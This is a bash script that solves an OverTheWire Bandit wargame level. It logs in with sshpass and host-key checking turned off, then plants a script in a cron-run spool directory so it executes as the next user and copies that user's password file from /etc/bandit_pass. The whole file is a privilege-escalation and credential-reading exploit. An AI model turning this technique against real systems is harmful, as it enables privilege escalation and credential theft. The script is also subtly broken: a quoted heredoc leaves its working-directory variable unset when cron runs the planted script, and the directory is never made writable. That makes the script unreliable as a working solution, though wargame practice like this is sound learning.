#!/bin/bash

PASSWORD=$1
HOST="bandit.labs.overthewire.org"
PORT=2220
USER="bandit23"

CMD="
WORKDIR=\"/tmp/myscript_\$(date +%s)\"
mkdir -p \$WORKDIR
cat > \$WORKDIR/script.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > \$WORKDIR/password
EOF
chmod +x \$WORKDIR/script.sh
cp \$WORKDIR/script.sh /var/spool/bandit24/foo/
sleep 60
cat \$WORKDIR/password
"

sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p $PORT $USER@$HOST "$CMD"